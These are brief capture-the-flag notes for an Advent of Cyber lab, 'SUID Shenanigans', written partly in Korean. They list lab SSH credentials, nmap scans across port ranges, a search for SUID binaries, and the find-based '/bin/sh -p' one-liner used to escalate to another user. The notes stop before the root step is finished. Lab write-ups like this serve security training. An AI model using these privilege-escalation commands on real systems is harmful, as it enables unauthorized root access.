# Advent of Cyber Day8 :  SUID Shenanigans
```
export IP = 10.10.157.61

[+] SSH credential
Deploy and SSH into the machine.
Username: holly
Password: tuD@4vt0G*TU

#1 What port is SSH running on? (Search google )
: 65534

- nmap -p0-1000 -Pn -A -v 10.10.157.61 
- nmap -p1000-2000 -Pn -A -v 10.10.157.61
-  """
- nmap -p60000-65535 -Pn -A -v 10.10.157.61

#2 Find and run a file s igor. Read the file /home/igor/flag1.txt
- find / -perm -4000 2>/dev/null 혹은 linpeas를 이용해 권한상승 가능한 파일 검색
- SUID : /usr/bin/find
- ./find . -exec /bin/sh -p \; -quit
: get the igor priviliege 

#3 Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
- find / -user root -perm -4000 2>dev/null
- /bin/bash


```